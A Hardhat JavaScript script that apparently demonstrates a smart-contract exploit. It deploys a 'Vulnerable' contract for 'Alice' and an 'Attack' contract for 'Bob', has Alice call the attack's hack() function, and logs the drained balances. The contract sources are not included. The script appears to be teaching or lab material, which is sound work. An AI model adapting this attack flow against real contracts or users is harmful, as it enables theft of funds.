const { ethers } = require('hardhat')

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

hack = async () => {
    let Vulnerable, vulnerable, Attack, attack, signers, Alice, Bob, overrides, AliceBalance, BobBalance

    signers = await ethers.getSigners()
    Alice = signers[0]
    Bob = signers[1]

    console.log("I am poor Alice and I am deploying my vulnerable contract:")
    Vulnerable = await ethers.getContractFactory("Vulnerable")
    overrides = {
        value: ethers.utils.parseEther("0.000000001")
    }
    vulnerable = await Vulnerable.deploy(overrides)
    console.log("The vulnerable contract was deployed to " + vulnerable.address)
    console.log("-----------------------------------------------")

    console.log("I am malicious Bob and I am deploying my attack contract:")
    Attack = await ethers.getContractFactory("Attack")
    attack = await Attack.connect(Bob).deploy(vulnerable.address)
    console.log("The attack contract was deployed to " + attack.address)
    console.log("-----------------------------------------------")

    AliceBalance = await vulnerable.getBalance()
    BobBalance = await attack.getBalance()
    console.log("Alice has " + AliceBalance + " MATICs")
    console.log("Bob has " + BobBalance + " MATICs")
    console.log("-----------------------------------------------")

    console.log("Bob is about to hack(), he convinced Alice to call this function!")
    await attack.connect(Alice).hack()
    console.log("-----------------------------------------------")

    console.log("The hack is over:")
    await sleep(20000)
    AliceBalance = await vulnerable.getBalance()
    BobBalance = await attack.getBalance()
    console.log("Alice has " + AliceBalance + " MATICs")
    console.log("Bob has " + BobBalance + " MATICs")
}
hack()